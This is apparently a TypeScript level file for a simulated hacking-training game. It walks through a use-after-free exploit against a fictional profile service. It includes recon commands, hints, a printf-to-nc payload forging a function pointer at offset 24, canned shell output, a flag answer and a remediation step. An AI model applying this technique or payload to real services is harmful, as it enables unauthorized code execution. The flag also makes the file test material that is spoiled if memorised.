import type { ChainDef } from "../../types";
import { match, strictCmd, normalize, matchesExactAddress, matchesExactOffset } from "../../engine";

const IP = "192.0.2.80";

export const ghostLevel8: ChainDef = {
  id: "ghost-8",
  difficulty: "ghost",
  order: 8,
  points: 300,
  title: "Dangling Reference",
  codename: "GHOST ASSESSMENT — DANGLING REFERENCE",
  summary: "Deleting a profile frees its memory. Nothing stops you from asking the service to use it again before something else claims that same slot — or from making sure something else claims it first.",
  briefing: [
    `TARGET: Larkspur Systems — ${IP}`,
    "OBJECTIVE: get a shell on the live service and prove it.",
    "",
    "No overflow this time, no bad format string. A profile service frees memory on delete, and keeps",
    "using a reference to it anyway. Find out what happens if you control what fills that memory back",
    "in before the dangling reference gets used again.",
  ],
  debrief: [
    "root cause: profiled kept a cached reference to a profile object after it was explicitly freed on",
    "delete (CWE-416, use-after-free), and later called through a function pointer inside that freed",
    "object without ever re-validating it. Allocating a new, attacker-controlled profile of the same",
    "size reused the freed memory (a normal, expected allocator behavior) — placing a forged function",
    "pointer exactly where the freed object's render callback used to live. Rendering the 'deleted'",
    "profile called straight into it.",
    "",
    "LARKSPUR SYSTEMS: SECURED.",
  ],
  nodes: [
    {
      id: "larkspur",
      org: "Larkspur Systems",
      city: "Larkspur",
      state: "CO",
      coords: { x: 34.3, y: 28.6 },
      ip: IP,
      tagline: "Profile management service vendor",
      briefing: [`IP: ${IP}`, "No further information provided."],
      initialPrompt: "op@breachline:~$",
      motd: [],
      objectives: [
        { id: "recon", label: "Enumerate open services on the target", tactic: "Reconnaissance" },
        { id: "identify", label: "Locate and retrieve the exposed binary", tactic: "Discovery", requires: ["recon"] },
        { id: "analyze", label: "Determine the binary's memory protections", tactic: "Discovery", requires: ["identify"] },
        { id: "find-bug", label: "Confirm a deleted profile is still reachable after being freed", tactic: "Discovery", requires: ["analyze"] },
        { id: "find-winfunc", label: "Find the address of a hidden backdoor render function", tactic: "Discovery", requires: ["find-bug"] },
        { id: "find-offset", label: "Find the function-pointer field's byte offset inside the profile struct", tactic: "Discovery", requires: ["find-winfunc"] },
        { id: "exploit", label: "Reclaim the freed slot with a forged function pointer and trigger it", tactic: "Initial Access", requires: ["find-offset"] },
        { id: "loot", label: "Recover proof of shell access", tactic: "Collection", requires: ["exploit"] },
        { id: "secure", label: "Null out freed references and validate objects before use", tactic: "Remediation", requires: ["loot"] },
      ],
      hints: [
        "freeing memory doesn't erase it, and it doesn't stop anything else from being handed that same memory on the next allocation of the same size. if something keeps a reference after a free, that's the bug.",
        "confirm the use-after-free first: create a profile, delete it, then ask the service to use it again anyway and see whether it still does something.",
        "once you know a freed slot gets reused, the plan is: free the victim slot, immediately allocate a new object of the same size with a forged function pointer at the right byte offset, then trigger whatever still holds a dangling reference to the original.",
      ],
      debrief: [],
      commands: [
        strictCmd({
          id: "nmap",
          tool: "nmap",
          requires: [IP],
          help: "nmap -sV <ip>",
          run: () => ({
            completesObjective: "recon",
            tone: "success",
            setsFlags: ["scanned"],
            output: [
              "PORT     STATE SERVICE VERSION",
              "80/tcp   open  http    nginx 1.24.0 (internal file share)",
              "5050/tcp open  unknown profiled (custom protocol)",
              "",
              "Nmap done: 1 IP address (1 host up) scanned in 4.15 seconds",
            ],
          }),
        }),
        strictCmd({
          id: "curl-files",
          tool: "curl",
          requires: ["http://" + IP],
          forbids: ["files/profiled"],
          help: "curl http://<ip>/files/",
          requiresFlags: ["scanned"],
          run: () => ({
            tone: "output",
            output: [
              "HTTP/1.1 200 OK",
              "",
              "<title>Internal Build Share</title>",
              '<a href="/files/profiled">profiled (release build, unstripped)</a>',
            ],
          }),
        }),
        strictCmd({
          id: "curl-download",
          tool: "curl",
          requires: ["http://" + IP, "files/profiled"],
          help: "curl -O http://<ip>/files/profiled",
          requiresFlags: ["scanned"],
          run: () => ({
            completesObjective: "identify",
            tone: "success",
            setsFlags: ["have_binary"],
            output: [
              "HTTP/1.1 200 OK",
              "Saving to: 'profiled'",
              "",
              "profiled: ELF 64-bit LSB executable, x86-64, dynamically linked, not stripped",
            ],
          }),
        }),
        strictCmd({
          id: "checksec",
          tool: "checksec",
          requires: ["profiled"],
          help: "checksec ./profiled",
          requiresFlags: ["have_binary"],
          run: () => ({
            completesObjective: "analyze",
            tone: "success",
            setsFlags: ["saw_protections"],
            output: [
              "CANARY    : disabled",
              "NX        : enabled",
              "PIE       : disabled",
              "RELRO     : partial",
              "Heap      : glibc 2.27, no safe-linking",
              "",
              "note: no stack bug is going to matter here — this service's vulnerability is in how it",
              "manages heap objects, not the stack.",
            ],
          }),
        }),
        {
          id: "find-bug",
          tool: "nc",
          match: (input) => {
            const n = normalize(input);
            return n.includes(IP) && n.includes("5050") && n.includes("create 1") && n.includes("delete 1") && n.includes("render 1");
          },
          help: 'printf "CREATE 1 test\\nDELETE 1\\nRENDER 1\\n" | nc <ip> 5050',
          requiresFlags: ["saw_protections"],
          run: () => ({
            completesObjective: "find-bug",
            tone: "success",
            setsFlags: ["have_uaf"],
            output: [
              "profile 1 created",
              "profile 1 deleted",
              "rendering profile 1: [default profile render]",
              "",
              "[!] profile 1 was deleted, and RENDER 1 still worked — the service kept a reference to",
              "    memory it already freed.",
            ],
          }),
        },
        strictCmd({
          id: "find-winfunc",
          tool: "objdump",
          requires: ["profiled", "backdoor_render"],
          help: "objdump -d ./profiled | grep backdoor_render",
          requiresFlags: ["have_uaf"],
          run: () => ({
            completesObjective: "find-winfunc",
            tone: "success",
            setsFlags: ["have_winfunc_addr"],
            note: "Larkspur profiled — hidden backdoor_render() @ 0x0000000000401310",
            output: [
              "0000000000401310 <backdoor_render>:",
              "  401310:  55                    push   %rbp",
              "  401314:  48 8d 3d ...          lea    ... ; \"/bin/sh\"",
              "  40131f:  e8 ...                call   system@plt",
              "",
              "note: backdoor_render() matches the render callback's signature exactly, but nothing in",
              "normal use ever calls it.",
            ],
          }),
        }),
        strictCmd({
          id: "find-offset",
          tool: "objdump",
          requires: ["profiled", "-t", "profile_t"],
          help: "objdump -t ./profiled | grep profile_t",
          requiresFlags: ["have_winfunc_addr"],
          run: () => ({
            completesObjective: "find-offset",
            tone: "success",
            setsFlags: ["have_struct_offset"],
            note: "Larkspur profiled — profile_t render callback field offset: 24 bytes",
            output: [
              "struct profile_t { char bio[24]; void (*render)(void); }; // 32 bytes total",
              "",
              "[+] the render function pointer sits at byte offset 24 — everything before it is just",
              "    the bio field, which you fully control.",
            ],
          }),
        }),
        {
          id: "exploit",
          tool: "nc",
          match: (input) => {
            const n = normalize(input);
            return (
              n.includes(IP) &&
              n.includes("5050") &&
              n.includes("delete 1") &&
              n.includes("create 2") &&
              matchesExactOffset(n, 24) &&
              matchesExactAddress(n, "401310") &&
              n.includes("render 1")
            );
          },
          help: 'printf "DELETE 1\\nCREATE 2 $(python3 -c \\"print(\'A\'*24 + p64(0x401310))\\")\\nRENDER 1\\n" | nc <ip> 5050',
          requiresFlags: ["have_struct_offset"],
          deniedOutput: ["you need the backdoor's address and the exact struct offset before this does anything but crash the service."],
          run: () => ({
            completesObjective: "exploit",
            tone: "success",
            setsFlags: ["shell_access"],
            promptAfter: "profile@larkspur:~$",
            output: [
              "profile 1 deleted — memory freed",
              "profile 2 created — allocator reused profile 1's freed slot",
              "rendering profile 1: [!] calling through a dangling reference into memory that's now",
              "                          profile 2's forged render pointer",
              "",
              "[+] shell obtained via a use-after-free reclaimed with a forged function pointer — no",
              "    stack corruption involved at all.",
            ],
          }),
        },
        strictCmd({
          id: "cat-flag",
          tool: "cat",
          requires: ["flag.txt"],
          help: "cat flag.txt",
          requiresFlags: ["shell_access"],
          run: () => ({
            completesObjective: "loot",
            tone: "success",
            note: "Larkspur Systems — flag.txt: a87ff679a2f3e71d9181a67b7542122c",
            output: ["a87ff679a2f3e71d9181a67b7542122c"],
          }),
        }),
        {
          id: "secure",
          tool: "secure",
          match: match.startsWith("secure system", "secure", "remediate"),
          help: "secure system",
          requiresObjectives: ["loot"],
          deniedOutput: ["confirm shell access before you file the fix."],
          run: () => ({
            completesObjective: "secure",
            tone: "success",
            output: [
              "[+] deleted profiles now null out every cached reference at free time",
              "[+] added a validity check before ever calling through the render pointer",
              "[+] removed the unused backdoor_render() function entirely",
              "",
              "LARKSPUR SYSTEMS: SECURED",
            ],
          }),
        },
      ],
    },
  ],
};
